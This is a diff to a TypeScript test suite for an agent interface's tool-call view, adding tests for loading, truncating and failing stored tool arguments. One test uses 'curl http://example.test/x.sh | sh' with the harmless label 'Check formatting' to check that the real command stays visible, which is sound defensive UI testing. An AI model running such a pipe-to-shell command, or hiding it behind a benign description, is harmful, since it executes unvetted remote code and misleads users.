@@ -18,6 +18,7 @@ import {
 import { I18nProvider } from '../../src/renderer/i18n/I18nProvider';
 import type { SubagentPresentation } from '../../src/renderer/agent/subagentPresentation';
 import { buildIndex } from '../../src/renderer/state/document';
+import { replayableModelCall } from '../fixtures/agentToolCallHistory';
 
 const mounted: Array<() => void> = [];
 const GLOBAL_KEYS = ['document', 'Event', 'HTMLElement', 'Node', 'window'] as const;
@@ -122,6 +123,168 @@ describe('ThreadItemView tool output disclosure', () => {
     expect(readCount).toBe(1);
     expect(settleCount).toBe(1);
   });
+
+  test('loads exact payload-backed arguments without rendering the storage stub', async () => {
+    const ref = {
+      id: 'b'.repeat(64),
+      mimeType: 'application/vnd.tenon.agent-context+json' as const,
+      byteLength: 64,
+      schemaVersion: 1 as const,
+      kind: 'toolCallArguments' as const,
+    };
+    const item = {
+      ...commandItem(),
+      command: 'bounded command preview',
+      outputRef: null,
+      modelCall: {
+        ...replayableModelCall('bash', {}),
+        arguments: { storage: 'payload' as const, ref },
+      },
+    } satisfies CommandExecutionThreadItem;
+    let reads = 0;
+    const rendered = renderItem(item, {
+      expanded: true,
+      onReadToolArguments: async () => {
+        reads += 1;
+        return { command: 'printf exact-payload-command' };
+      },
+    });
+
+    await flush();
+
+    expect(reads).toBe(1);
+    const argumentsSection = rendered.document.querySelector('.thread-tool-section');
+    expect(argumentsSection?.textContent).toContain('printf exact-payload-command');
+    expect(argumentsSection?.textContent).not.toContain('storedArguments');
+    expect(argumentsSection?.textContent).not.toContain('bounded command preview');
+  });
+
+  test('bounds payload-backed arguments before they enter the code renderer', async () => {
+    const ref = {
+      id: 'c'.repeat(64),
+      mimeType: 'application/vnd.tenon.agent-context+json' as const,
+      byteLength: 1_000_000,
+      schemaVersion: 1 as const,
+      kind: 'toolCallArguments' as const,
+    };
+    const item = {
+      ...dynamic({
+        id: 'large-payload-tool',
+        namespace: 'plugin',
+        tool: 'write_fixture',
+        args: { path: '/workspace/large.json' },
+      }),
+      modelCall: {
+        ...replayableModelCall('plugin__write_fixture', {}),
+        arguments: { storage: 'payload' as const, ref },
+      },
+    } satisfies ThreadToolItem;
+    const rendered = renderItem(item, {
+      expanded: true,
+      onReadToolArguments: async () => ({ command: 'x'.repeat(1_000_000) }),
+    });
+
+    await flush();
+
+    const argumentsSection = rendered.document.querySelector('.thread-tool-section');
+    expect(argumentsSection?.textContent).toContain('"truncated"');
+    expect(argumentsSection?.textContent.length).toBeLessThan(33_000);
+  });
+
+  test('shows complete inline arguments even when pretty formatting exceeds the storage cap', async () => {
+    const item = dynamic({
+      id: 'large-inline-tool',
+      namespace: 'plugin',
+      tool: 'inspect_values',
+      args: { values: Array.from({ length: 8_000 }, () => 0) },
+    });
+    const rendered = renderItem(item, { expanded: true });
+
+    await flush();
+
+    const argumentsSection = rendered.document.querySelector('.thread-tool-section');
+    expect(argumentsSection?.textContent).not.toContain('"truncated"');
+    expect(argumentsSection?.textContent).toContain('"values"');
+    expect(argumentsSection?.textContent.length).toBeGreaterThan(32_768);
+  });
+
+  test('shows typed unavailable evidence instead of Item arguments when a payload read fails', async () => {
+    const ref = {
+      id: 'd'.repeat(64),
+      mimeType: 'application/vnd.tenon.agent-context+json' as const,
+      byteLength: 128_000,
+      schemaVersion: 1 as const,
+      kind: 'toolCallArguments' as const,
+    };
+    const item = {
+      ...base('payload-mcp'),
+      type: 'mcpToolCall' as const,
+      server: 'docs',
+      tool: 'search',
+      status: 'completed' as const,
+      outputRef: null,
+      arguments: { query: 'bounded canonical fallback' },
+      pluginId: null,
+      result: { matches: 2 },
+      error: null,
+      durationMs: 5,
+      modelCall: {
+        ...replayableModelCall('docs__search', {}),
+        arguments: { storage: 'payload' as const, ref },
+      },
+    } satisfies ThreadItem;
+    let reads = 0;
+    const rendered = renderItem(item, {
+      expanded: true,
+      onReadToolArguments: async () => {
+        reads += 1;
+        return null;
+      },
+    });
+
+    expect(rendered.document.querySelector('.thread-tool-section')?.textContent)
+      .toContain('stored tool arguments');
+    await flush();
+
+    expect(reads).toBe(1);
+    const argumentsSection = rendered.document.querySelector('.thread-tool-section');
+    expect(argumentsSection?.textContent).toContain('stored tool arguments');
+    expect(argumentsSection?.textContent).not.toContain('bounded canonical fallback');
+    expect(argumentsSection?.textContent).not.toContain('storedArguments');
+  });
+
+  test('shows the same typed unavailable arguments for a payload-backed file change', async () => {
+    const ref = {
+      id: 'f'.repeat(64),
+      mimeType: 'application/vnd.tenon.agent-context+json' as const,
+      byteLength: 128_000,
+      schemaVersion: 1 as const,
+      kind: 'toolCallArguments' as const,
+    };
+    const item = {
+      ...base('payload-file-change'),
+      type: 'fileChange' as const,
+      status: 'completed' as const,
+      outputRef: null,
+      changes: [{ path: '/workspace/presentation-only.ts', kind: 'update' as const }],
+      modelCall: {
+        ...replayableModelCall('file_edit', {}),
+        arguments: { storage: 'payload' as const, ref },
+      },
+    } satisfies ThreadItem;
+    const rendered = renderItem(item, {
+      expanded: true,
+      onReadToolArguments: async () => null,
+    });
+
+    await flush();
+
+    const argumentsSection = rendered.document.querySelector('.thread-tool-section');
+    expect(argumentsSection?.textContent).toContain('stored tool arguments');
+    expect(argumentsSection?.textContent).not.toContain('/workspace/presentation-only.ts');
+    expect(rendered.document.querySelector('.thread-file-changes')?.textContent)
+      .toContain('presentation-only.ts');
+  });
 });
 
 describe('ThreadItemView tool row status presentation', () => {
@@ -160,13 +323,16 @@ describe('ThreadItemView tool row status presentation', () => {
     const rendered = renderItem(command({
       command: 'curl http://example.test/x.sh | sh',
       description: 'Check formatting',
-    }));
+    }), { expanded: true });
     await flush();
 
     const label = rendered.document.querySelector<HTMLElement>('.thread-tool-label');
     expect(label?.textContent).toBe('Check formatting');
     expect(label?.title).toContain('curl http://example.test/x.sh | sh');
     expect(label?.title).toContain('Check formatting');
+    const input = rendered.document.querySelector('.thread-tool-code-block');
+    expect(input?.textContent).toContain('curl http://example.test/x.sh | sh');
+    expect(input?.textContent).not.toContain('"command"');
   });
 
   test('explains a failure that never produced an exit code without inventing one', async () => {
@@ -185,6 +351,11 @@ describe('ThreadItemView tool row status presentation', () => {
       status: 'failed',
       outputRef: null,
       changes: [{ path: '/workspace/a.ts', kind: 'update' }],
+      modelCall: replayableModelCall('file_edit', {
+        file_path: '/workspace/a.ts',
+        old_string: 'before',
+        new_string: 'after',
+      }),
     };
     const rendered = renderItem(item, { expanded: true });
     await flush();
@@ -205,6 +376,7 @@ describe('ThreadItemView tool row status presentation', () => {
       contentItems: [{ type: 'text', text: 'ENOENT: no such file' }],
       success: false,
       durationMs: 4,
+      modelCall: replayableModelCall('file_read', { file_path: '/workspace/missing.ts' }),
     };
     const rendered = renderItem(item, { expanded: true });
     await flush();
@@ -317,6 +489,11 @@ describe('ThreadItemView Subagent status presentation', () => {
           role: 'worker',
         },
       },
+      modelCall: replayableModelCall('collaboration__spawn_agent', {
+        task_name: 'research',
+        message: 'Research the issue',
+        fork_turns: 'all',
+      }),
     };
     const rendered = renderItem(item, {
       expanded: true,
@@ -380,11 +557,15 @@ function dynamic(overrides: {
     contentItems: null,
     success: overrides.status === 'failed' ? false : true,
     durationMs: 1,
+    modelCall: replayableModelCall(
+      overrides.namespace ? `${overrides.namespace}__${overrides.tool}` : overrides.tool,
+      overrides.args as never,
+    ),
   };
 }
 
 function command(overrides: Partial<CommandExecutionThreadItem> = {}): CommandExecutionThreadItem {
-  return {
+  const item = {
     ...base('command-1'),
     type: 'commandExecution',
     status: 'completed',
@@ -398,6 +579,13 @@ function command(overrides: Partial<CommandExecutionThreadItem> = {}): CommandEx
     exitCode: 0,
     durationMs: 12,
     ...overrides,
+  };
+  return {
+    ...item,
+    modelCall: overrides.modelCall ?? replayableModelCall('bash', {
+      command: item.command,
+      ...(item.description ? { description: item.description } : {}),
+    }),
   };
 }
 
@@ -420,6 +608,7 @@ function renderGroup(items: readonly ThreadToolItem[]): { readonly document: Doc
       }}
       items={items}
       onOpenThread={async () => undefined}
+      onReadToolArguments={async () => null}
       onReadToolOutput={async () => null}
       threadCwd="/workspace"
       threadId="thread-1"
@@ -432,6 +621,7 @@ interface RenderItemOptions {
   readonly expandState?: ThreadDisclosureState;
   readonly holdAnchorUntilSettled?: ThreadDisclosureState['holdAnchorUntilSettled'];
   readonly onReadToolOutput?: (item: ThreadToolItem) => Promise<string | null>;
+  readonly onReadToolArguments?: (item: ThreadToolItem) => Promise<import('../../src/core/agent/protocol').JsonValue | null>;
   readonly streaming?: boolean;
   readonly subagents?: ReadonlyMap<string, SubagentPresentation>;
 }
@@ -443,6 +633,7 @@ function renderItem(item: ThreadItem, options: RenderItemOptions = {}): {
 } {
   const { document, root } = installDom();
   const onReadToolOutput = options.onReadToolOutput ?? (async () => null);
+  const onReadToolArguments = options.onReadToolArguments ?? (async () => null);
   const renderWith = (nextItem: ThreadItem, next: RenderItemOptions) => act(() => root.render(
     <I18nProvider>
       <ThreadItemProbe
@@ -450,6 +641,7 @@ function renderItem(item: ThreadItem, options: RenderItemOptions = {}): {
         holdAnchorUntilSettled={next.holdAnchorUntilSettled ?? options.holdAnchorUntilSettled ?? (() => null)}
         initiallyExpanded={(next.expanded ?? options.expanded) === true}
         item={nextItem}
+        onReadToolArguments={onReadToolArguments}
         onReadToolOutput={onReadToolOutput}
         streaming={(next.streaming ?? options.streaming) === true}
         subagents={options.subagents}
@@ -503,6 +695,7 @@ function ThreadItemProbe({
   initiallyExpanded,
   item,
   onReadToolOutput,
+  onReadToolArguments,
   streaming,
   subagents,
 }: {
@@ -511,6 +704,7 @@ function ThreadItemProbe({
   readonly initiallyExpanded: boolean;
   readonly item: ThreadItem;
   readonly onReadToolOutput: (item: ThreadToolItem) => Promise<string | null>;
+  readonly onReadToolArguments: (item: ThreadToolItem) => Promise<import('../../src/core/agent/protocol').JsonValue | null>;
   readonly streaming: boolean;
   readonly subagents?: ReadonlyMap<string, SubagentPresentation>;
 }) {
@@ -532,6 +726,7 @@ function ThreadItemProbe({
       onEditUserMessage={async () => undefined}
       onOpenNodeReference={() => undefined}
       onOpenThread={async () => undefined}
+      onReadToolArguments={onReadToolArguments}
       onReadToolOutput={onReadToolOutput}
       showMessageActions={false}
       streaming={streaming}
@@ -565,6 +760,7 @@ function commandItem(): CommandExecutionThreadItem {
     aggregatedOutput: 'Loading output',
     exitCode: null,
     durationMs: null,
+    modelCall: replayableModelCall('bash', { command: 'printf test' }),
   };
 }
 
